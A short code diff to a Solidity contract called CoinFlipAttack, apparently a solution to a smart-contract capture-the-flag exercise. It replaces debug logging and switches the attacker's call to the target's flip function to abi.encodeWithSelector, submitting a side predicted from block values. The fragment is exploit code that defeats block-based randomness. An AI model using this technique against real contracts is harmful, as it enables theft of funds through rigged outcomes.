@@ -14,13 +14,16 @@ contract CoinFlipAttack {
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
 
-        console.logString("GOT HEREEEEEEEEEEEEE 111");
+        /* EASY WAY */
+        // bool success = ICoinFlip(coinFlipInstance).flip(side);
+
+        /* HARDER WAY */
         // get function selector
         bytes4 flipSelector = ICoinFlip.flip.selector;
         // call coinFlip function on target contract
-        (bool success, ) = coinFlipInstance.call(abi.encodePacked(flipSelector, side));
+        console.logBytes(abi.encodePacked(flipSelector, side));
+        (bool success, ) = coinFlipInstance.call(abi.encodeWithSelector(flipSelector, side));
 
-        console.logString("GOT HEREEEEEEEEEEEEE 222");
         return success;
 
     }
